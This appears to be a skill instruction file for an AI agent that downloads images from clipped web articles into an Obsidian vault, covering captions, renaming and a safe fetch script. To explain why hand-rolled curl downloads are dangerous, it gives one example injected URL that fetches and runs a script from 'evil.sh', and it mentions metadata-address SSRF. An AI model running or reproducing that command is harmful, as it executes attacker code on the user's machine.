# Image download, captions, and reference rewriting (step 6)

**Read this when** the body contains anything image-shaped: a markdown `![](url)`, a click-to-enlarge `[![](img)](link)` wrapper, an HTML `<img>`/`<figure>`, a `data:` URI, or — on a reprocess — existing `![[…]]` embeds that may need renaming. A clip with no images skips this file entirely.

**What counts as an image to process**, in source order — any of these forms:
- a markdown image `![](<url>)` (the common case);
- a markdown image wrapped in a link, `[![](<imgurl>)](<linkurl>)` (a click-to-enlarge image) — process the inner image and **drop the outer link wrapper** (the link target is almost always just a larger copy of the same image, and an Obsidian embed can't carry an outer link cleanly). The result is a plain `![[…]]` embed, not `[![[…]]](linkurl)`;
- an HTML image, `<img src='<url>' …>`, including inside a `<figure>…</figure>` — Web Clipper emits these instead of markdown on some sites. Treat the `src` URL exactly like a markdown image URL, and if there's a `<figcaption>…</figcaption>`, treat its text as the image's caption. (This is the one place step 5's "strip stray HTML" must NOT delete the tag — `<img>`/`<figure>`/`<figcaption>` are handled here, not stripped there.)

**Reprocessing branch — the body already has `![[…]]` embeds, not downloadable images.** When the input was an already-`Articles/` file, its images are Obsidian embeds like `![[Oldslug_fig_N.ext]]` with the file already sitting in `Sources/Images/`. Do **not** re-download these. Instead:
- If the recomputed slug (step 3) **differs** from the old one, rename the whole set with `fetch_images.py rename --attachments '<vault>/Sources/Images' --sources '<vault>/Sources/PDFs' --old-slug '<Oldslug>' --new-slug '<Newslug>'` (run it with `--dry-run` first to see the plan), then rewrite each embed to `![[Newslug_fig_N.ext]]`. **`--sources` is not optional in practice.** `Sources/Images/` is flat and shared, so a stem's figures may be a PDF's; given the vault's `Sources/PDFs`, an `<Oldslug>.pdf` found anywhere beneath it (the folder is recursive — book chapters live in `Sources/PDFs/<Work>/`) refuses the whole rename and says the move is pdf-organizer's. Left off, that check simply never runs and the only evidence left is a figure-label spelling. Not a bare `mv`: a corrected author or year can land on a slug that **already owns figures**, and `mv` replaces them with no error and no way back — the script refuses an occupied destination per file and reports it, while still allowing the case-only rename (`teslo_…` → `Teslo_…`) that a case-insensitive volume makes look like a collision. If a source file is missing (user moved/deleted it) the script reports it; leave a `<!-- missing attachment: Oldslug_fig_N.ext -->` note and flag it in the report rather than silently dropping the embed.
- If the slug is **unchanged**, leave the embeds and their files exactly as they are.
- A reprocessed body could in principle contain both pre-existing `![[…]]` embeds and a stray new `![](url)` — handle each by its own form (rename the embeds, download the URLs).

For each downloadable image (markdown/HTML/linked `url`), in source order:

1. On a fresh note, increment a counter starting at 1 in source order. On a reprocess, preserve existing figure numbers and allocate new downloads after the highest occupied number; inserting a new image before an existing embed must not reuse that embed's slot.
2. **Hand the URLs to `scripts/fetch_images.py`, in source order, on one shared counter** — SKILL.md step 6 has the invocation. Items 3 and 4 below describe what it does; they are here so you can read its output, **not so you can do it by hand**.

   ```bash
   python3 '<skill>/scripts/fetch_images.py' download --attachments '<vault>/Sources/Images' \
       --slug '<image_slug>' --start <N> '<url1>' '<url2>' …
   ```

   **Do not hand-roll this with `curl` and `mv`.** Every URL here came out of a page fetched from the open web, which means it was chosen by whoever wrote that page, and the shell one-liner this file used to recommend gave that person four things the script does not:

   - **Command execution.** `curl … "<url>"   # NO` interpolates the URL into a double-quoted shell word, and `$(…)`, backticks and `${…}` all still expand there. A body image written `![](https://x/$(curl evil.sh|sh))` runs that command (`CONVENTIONS.md` §1b). The script takes the URL as one argv element and never builds a command line from it.
   - **Anywhere-you-can-reach fetching.** `curl` speaks `file:`, and a clip legitimately carries `file://` image links; it will also happily fetch `http://169.254.169.254/…` or anything else inside the network the user's machine sits in. The script allows only `http`, `https` and `data:`, refuses hosts resolving to loopback/link-local/private space, and **re-checks both at every redirect hop** — an `http →  file:` or public → internal redirect is where an unguarded fetch actually goes wrong.
   - **An unbounded write into the vault.** `curl -o` has no size cap and no wall-clock budget, so one hostile or broken response fills the disk or hangs the run. The script caps bytes and wall-clock, counting the bytes it actually receives rather than believing `Content-Length`.
   - **A non-image written as an image.** The script detects the type from the bytes, and reports a JSON/HTML error body as a *failure* so item 8's placeholder goes in, instead of leaving a `.png` Obsidian renders as a broken image. A `Content-Type: image/png` on a JSON body does not save it: the header is a hint, the bytes decide.

   **Those four are defaults, and three of them are flags you can move**, so read them as the values a plain invocation uses rather than as properties of the script:

   | Flag | Default | What moving it costs |
   |---|---|---|
   | `--max-bytes` | 25 MB (`26214400`) | raise it for a genuinely large figure; there is then no bound on what one response writes into the vault except the one you set |
   | `--max-seconds` | 120 | wall-clock across the whole transfer of one image — the only thing that stops a server dripping bytes forever, since `--timeout` resets per chunk |
   | `--timeout` | 45 | per-socket-operation timeout; capped at `--max-seconds`, because a per-socket timeout longer than the whole budget cannot fire |
   | `--allow-private-hosts` | **off** | turns the loopback/link-local/private-range refusal **off** — the guard the bullet above sells as unconditional. There is no clipped-image reason to pass it; it exists for a vault whose images sit on a host inside the user's own network, and passing it means `169.254.169.254` and `127.0.0.1` are fetchable again. Say so in the report if you ever do. |

   The scheme allowlist and the redirect re-check have no flag: those are not tunable.

   **Data-URI images** (`![](data:image/png;base64,…)`) go to the same script, in the same list — it decodes them, subject to the same size cap. If the script is genuinely unavailable, say so in the report and leave item 8's placeholder; a hand-rolled download is not the fallback.
3. It detects the actual file type **from the bytes**, not from the URL's extension and not from the `Content-Type` (Substack's `image/fetch` URLs end in `.png` but often serve webp; many CDNs do similar). The order is evidence first, claims second:
   - **Recognized image magic bytes win outright** — PNG, JPEG, GIF, WebP, AVIF, BMP, TIFF and ICO — even when the header says something else.
   - **An SVG is text, so it is checked as text:** the *root element* must be `<svg>` once a byte-order mark, an XML declaration, comments and a DOCTYPE are stepped over. An XHTML page or an RSS feed that merely contains an `<svg>` somewhere is not an SVG.
   - **Bytes that are recognizably something else lose, whatever the header claims** — text that is not an SVG root (a JSON error body, a plain-text 404, an HTML block page, including one behind a BOM or a comment), and binaries like a PDF, a ZIP, an ELF, a gzip stream or an mp4. These are **a failure**, per item 8. Not a `.png`. This is the case the header used to win: a JSON error body served as `Content-Type: image/png` was written into the vault and reported `ok`.
   - **Only genuinely unrecognized bytes fall through to the claims**, in the order the `Content-Type` mapping then the URL gives:
     - `image/png` → `png`; `image/jpeg` → `jpg`; `image/gif` → `gif`; `image/webp` → `webp`
     - an `image/*` subtype with no mapping → the URL's extension; if none, `png`
     - a `Content-Type` carrying no information at all (absent, `application/octet-stream`) → the URL's extension, and if there is none, **a failure** — nothing here is evidence of an image
   - A failure names what the bytes actually looked like ("the bytes look like a JSON body"), so the report says whether the CDN answered with an error document, a login wall, or the wrong file.
4. It publishes the complete file as `<vault>/Sources/Images/<image_slug>_fig_<N>.<ext>` and removes the scratch source. Publication stages bytes in a unique temporary directory beside `Sources/Images/`, outside the image folder, then uses a same-filesystem operation so an interrupted transfer cannot expose a partial figure or destroy the previous good one. New files use an exclusive hard link; explicit replacements use an atomic rename. If the filesystem cannot support safe publication, the command fails and leaves existing files alone. **An occupied `<image_slug>_fig_<N>.*` slot is refused, not overwritten**: a wrong `--start` would otherwise destroy an existing figure. On the deliberate reprocess path, `--overwrite` permits replacement.
5. **Look for a caption** in the line(s) immediately following the `![](<url>)` reference. A caption is short (typically one or two sentences, under ~200 characters), describes the image, and often takes a recognizable shape:
   - Italic line like `*Figure 1: gene expression heatmap.*`
   - Bold prefix like `**Figure 1.** Mechanism of daraxonrasib binding to KRAS.`
   - Plain attribution line like `Source: NEJM 2025` or `Credit: Author / Publication`.
   - A short standalone descriptive paragraph that doesn't advance the article's argument.
   - If the next paragraph is clearly continuing the body (multiple sentences, full prose register, references back to the article's argument), it's **not** a caption — leave it where it is and emit the plain embed.
   - **Be especially wary of the hero image at the very top of the article.** The paragraph right after it is very often the article's *lede* — its opening hook — not a caption. A second-person or scene-setting opening ("*You're the earliest known life form. There's no food around right now…*"), a full multi-sentence paragraph, or anything written in the article's narrative voice is body prose; italicizing it as a caption mangles the article's first impression. A caption describes or attributes the image ("micrograph of…", "Credit:…", "Figure 1…"); a lede draws the reader in. When the line after an image reads like prose the author wrote *to the reader* rather than *about the image*, treat it as body.
   - **When the call is genuinely ambiguous, default to treating the line as body (emit the plain embed) and flag it in the report** rather than silently italicizing it. A wrongly-demoted body paragraph is a much worse and harder-to-notice error than a caption that stayed an ordinary paragraph; the report flag (per step 13's fix-or-flag rule) lets the user confirm.
6. **Rewrite the image reference.** Replace the `![](<url>)` line with the Obsidian embed wikilink `![[<image_slug>_fig_<N>.<ext>]]` (no path prefix — Obsidian resolves `Sources/Images/` from the vault root).
7. **Normalize the caption (if there is one) to a single italic line directly under the embed:**
   ```
   ![[Teslo_Pancreatic_Cancer_2026_fig_1.png]]
   *Figure 1. Mechanism of daraxonrasib binding to KRAS G12D.*
   ```
   - The whole caption is wrapped in a single pair of `*`s — italic, not bold. Strip any existing `*`, `**`, or `_` formatting **inside** the caption text first, then wrap the cleaned text in one outer `*…*` pair. This prevents nested markdown like `**Figure 1.** plain text` or `*nested *italic* inside*`.
   - Strip a trailing stray footnote or figure-number marker that got swept into the caption text — e.g. a caption ending `… performance. 12.` or `… diagram.[^4]` where the `12.`/`[^4]` is leftover litter rather than part of the caption sentence. Keep the descriptive sentence, drop the dangling marker.
   - Preserve any inline `[text](url)` links inside the caption — those are part of the article and stay clickable. Drop trailing whitespace and ensure the caption ends with a single period.
   - Leave one blank line before the embed and one blank line after the italic caption, so the image+caption pair reads as its own paragraph block.
   - The caption-italic styling is the one place this skill **adds** formatting that wasn't in the source — it's a structural rule for visual consistency across notes, and overrides the "preserve bold/italic exactly" rule from step 5.
8. If download fails (404, timeout, unsupported scheme), leave a placeholder comment `<!-- image download failed: <url> -->` in place of the reference and keep going. Note the failure in the final report. If a caption was attached to a failed download, leave the caption paragraph in place (don't italicize it, since there's no image to caption).

Run downloads sequentially, not in parallel — keeps it simple and avoids hammering CDNs.
